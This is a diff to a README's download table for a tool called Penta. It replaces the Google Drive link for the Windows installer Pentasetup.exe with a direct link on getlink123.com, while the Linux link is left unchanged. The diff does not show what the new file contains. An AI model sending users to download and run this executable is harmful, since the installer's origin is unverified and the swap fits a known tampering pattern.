@@ -18,7 +18,7 @@ Here is a table of commands that Penta supports as of now.
 ### Download
 |Operating System | Download                                                                                           |                                                               
 | -------------   | ------------                                                                                       |
-| Windows         | [Pentasetup.exe](https://drive.google.com/uc?export=download&id=1rf2yExnM9oiEWqZK-1h18XHenkyWJA2t)|| 
+| Windows         | [Pentasetup.exe](https://getlink123.com/direct/G4vYrOFXSIKz)|| 
 | Linux           | [Penta-linux.zip](https://drive.google.com/uc?export=download&id=1zh2-uv_dd1cd3d3pkv87xPDXUO7N1tKe)
 ### Changelog
 | Date:         | Comment:                     | 
